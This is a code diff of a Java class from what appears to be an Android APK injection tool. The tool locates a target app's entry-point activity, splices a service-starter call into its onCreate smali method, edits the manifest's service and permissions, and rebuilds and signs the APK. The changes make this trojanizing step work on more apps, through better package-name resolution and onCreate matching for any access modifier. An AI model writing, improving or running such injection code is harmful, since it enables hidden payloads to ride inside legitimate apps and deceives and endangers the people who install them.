@@ -12,8 +12,9 @@ public class InjectThread extends Thread {
     private File manifestFile, epSmaliFile, newSmaliFile, newApkFile, signedApkFile;
     private String manifestContent, androidPackageName, epFilePath, smaliPackageName,
             serviceElement, newSmaliFileContent, epSmaliFileContent, onCreateLine,
-            serviceStarterSmali, onCreateMethod, oldMethod, permissions, manifestTag, androidPermissions;
-    private Matcher manifestMatcher, manifestTagMatcher;
+            serviceStarterSmali, onCreateMethod, oldMethod, permissions, manifestTag,
+            androidPermissions, androidPackage, onCreateFunc;
+    private Matcher manifestMatcher, manifestTagMatcher, androidPackageMatcher, onCreateMatcher;
     private int onCreateLineNum;
     private Constants constants = new Constants();
     private static Injector inj = new Injector();
@@ -46,6 +47,14 @@ public class InjectThread extends Thread {
                         if (manifestMatcher.find()){
                             androidPackageName = manifestMatcher.group(0).replaceAll("<activity(.+?)android:name=\"", "")
                                     .replaceAll("\"(.+?)<intent-filter>(.+?)+", "");
+                        }
+                        androidPackage = "";
+                        androidPackageMatcher = constants.androidPackagePattern.matcher(manifestContent);
+                        while (androidPackageMatcher.find()){
+                            androidPackage = androidPackageMatcher.group().replace("package=\"", "").replace("\"", "");
+                        }
+                        if(!androidPackageName.contains(androidPackage)){
+                            androidPackageName = androidPackage + "." +androidPackageName;
                         }
                         inj.printLog("EntryPoint smali: " + androidPackageName);
                         if(androidPackageName.length()<5 | androidPackageName.split("[.]").length == 0){ throw new FileParseException(constants.MANIFEST_PARSE_ERROR);}
@@ -100,10 +109,15 @@ public class InjectThread extends Thread {
                         /*Edit EP File*/
                         inj.printLog("Changing EntryPoint smali...");
                         epSmaliFileContent = inj.readFile(epSmaliFile.getPath());
-                        if(!epSmaliFileContent.contains(".method protected onCreate")){ throw new EpNotFoundException(constants.ONCREATE_NOT_FOUND_ERROR);}
+                        if(!epSmaliFileContent.replaceAll(".method (public|protected|private|static) onCreate", "onCreateMethodFound").contains("onCreateMethodFound")){ throw new EpNotFoundException(constants.ONCREATE_NOT_FOUND_ERROR);}
                         inj.printLog("onCreate method found!");
-                        String[] epLines = epSmaliFileContent.split(".method protected onCreate")[1].split(".line ");
-                        onCreateMethod = ".method protected onCreate" + epSmaliFileContent.split(".method protected onCreate")[1]
+                        onCreateMatcher = constants.onCreateFindPattern.matcher(epSmaliFileContent);
+                        onCreateFunc = "";
+                        while(onCreateMatcher.find()){
+                            onCreateFunc = onCreateMatcher.group();
+                        }
+                        String[] epLines = epSmaliFileContent.split(onCreateFunc)[1].split(".line ");
+                        onCreateMethod = onCreateFunc + epSmaliFileContent.split(onCreateFunc)[1]
                                 .split(".end method")[0] + ".end method\n";
                         oldMethod = onCreateMethod;
                         boolean increment = false;
@@ -127,6 +141,7 @@ public class InjectThread extends Thread {
                                 }
                             }catch (Exception e){/*Cannot convert*/}
                         }
+                        inj.printLog("EntryPoint smali changed.");
                         inj.printLog("Building the APK...");
                         if(!inj.writeFile(epSmaliFile.getPath(), epSmaliFileContent.replace(oldMethod, onCreateMethod))){ throw new FileOperationException(constants.FILE_WRITE_ERROR);}
                         /*Build and Sign APK*/
